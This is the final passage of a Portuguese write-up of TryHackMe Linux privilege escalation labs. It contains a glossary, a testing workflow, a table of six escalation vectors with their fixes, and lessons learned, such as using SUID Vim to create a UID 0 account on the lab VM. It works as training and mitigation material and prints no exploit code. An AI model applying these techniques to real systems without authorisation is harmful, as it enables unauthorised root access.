| **Shell** | Interpretador de comandos, como Bash ou sh |
| **Root** | Conta administrativa do Unix/Linux, geralmente com UID 0 |
| **Hash** | Resultado de função criptográfica unidirecional usado, entre outros fins, na verificação de senhas |
| **Salt** | Valor incorporado ao processo de hashing para evitar hashes idênticos em senhas iguais |
| **GTFOBins** | Catálogo de comportamentos de binários Unix úteis para auditoria e abuso de permissões |
| **ETXTBSY** (*Text file busy*) | Erro que pode surgir quando um executável está aberto para escrita |
| **TryHackMe (THM)** | Plataforma de laboratórios de treinamento em segurança |

[↑ Voltar ao índice](#topo)

---

<a id="mitigacao"></a>

## 12. Mitigação, fluxo mental e conclusão

### O fluxo que funcionou melhor

~~~text
1. Identificar usuário e ambiente (id, sudo -l)
           ↓
2. Enumerar controles especiais (SUID, capabilities, cron, NFS)
           ↓
3. Encontrar configuração incomum
           ↓
4. Verificar permissões e comportamento real do programa
           ↓
5. Selecionar a técnica compatível com a VM
           ↓
6. Testar em ambiente autorizado
           ↓
7. Confirmar UID/EUID e recuperar evidências
           ↓
8. Remover artefatos e documentar mitigação
~~~

### Comparação das seis técnicas

| Vetor | Falha fundamental | Correção prioritária |
|---|---|---|
| Sudo e LD_PRELOAD | Execução privilegiada permissiva e ambiente inseguro | Restringir sudoers e variáveis preservadas |
| SUID | Binário privilegiado pode alterar arquivos ou executar funções perigosas | Remover SUID desnecessário |
| PATH Hijacking | Programa privilegiado procura comandos em diretórios não confiáveis | Usar caminhos absolutos e PATH controlado |
| Capabilities | Capability perigosa concedida a interpretador genérico | Revogar capabilities excessivas |
| Cron Jobs | Root executa script gravável por outros usuários | Corrigir proprietário/permissões e auditar tarefas |
| NFS | Export gravável com no_root_squash para clientes não confiáveis | Aplicar root_squash e restringir acesso |

### O que levei dos laboratórios

A parte mais importante não foi decorar um exploit, mas **entender por que ele se encaixa em determinada configuração**.

- O Apache2 revelou uma linha protegida porque tentou interpretá-la como configuração.
- O Vim com SUID permitiu modificar o banco de contas e criar outra identidade UID 0 na VM.
- O PATH Hijacking funcionou quando substituí o comando que o binário real procurava (<code>whoami</code>), e não o nome do exemplo (<code>thm</code>).
- A capability do Python demonstrou que um binário pode ter permissões perigosas sem possuir SUID.
- O Cron mostrou o risco de executar periodicamente scripts graváveis por qualquer usuário.
- O NFS demonstrou como <code>no_root_squash</code> pode atravessar a fronteira entre duas máquinas e permitir execução privilegiada.

No NFS, inclusive, dois pequenos erros atrasaram o processo: compilar diretamente no compartilhamento provocou <code>Text file busy</code>, e depois apliquei <code>chmod</code> ao arquivo <code>nfs</code> em vez de <code>nfs2</code>. Conferir o caminho, o proprietário e o bit <code>s</code> resolveu.

**Regra prática:** enumerar, interpretar permissões, entender a chamada do programa, testar, comprovar o UID e registrar a correção. É assim que os comandos deixam de ser apenas receitas copiadas e passam a fazer sentido.

### Referências

- [GTFOBins](https://gtfobins.github.io/) — usos especiais de binários Unix.
- [TryHackMe](https://tryhackme.com/) — laboratórios e exercícios de Linux Privilege Escalation.
- Documentação local: <code>man sudoers</code>, <code>man capabilities</code>, <code>man exports</code>, <code>man 5 crontab</code>, <code>man find</code> e <code>man ld.so</code>.

[↑ Voltar ao topo](#topo)
